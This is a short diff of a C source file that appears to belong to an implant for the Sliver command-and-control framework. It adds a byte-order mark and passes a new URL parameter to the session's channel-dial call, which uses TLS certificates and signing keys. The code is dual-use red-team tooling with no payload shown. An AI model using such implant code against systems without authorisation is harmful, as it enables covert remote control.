@@ -1,4 +1,4 @@
-/* src/modes/session.c - interactive session scheduler.
+﻿/* src/modes/session.c - interactive session scheduler.
  *
  * Owns the session lifecycle only: register, accept-driven request/response and
  * teardown. The wire pipeline (TLS, MUX/1, yamux, signed frames) lives behind
@@ -149,7 +149,7 @@ int sliver_session_run(const sliver_session_config_t *cfg) {
   sliver_buf_init(&env_buf);
 
   err[0] = '\0';
-  if (sliver_channel_dial(cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem, cfg->key_pem,
+  if (sliver_channel_dial(cfg->url, cfg->host, cfg->port, cfg->ca_pem, cfg->cert_pem, cfg->key_pem,
                           cfg->age_private_key, cfg->server_minisign_pubkey, &ch, err,
                           sizeof(err)) != 0) {
     LOG_ERROR("session: %s", err);
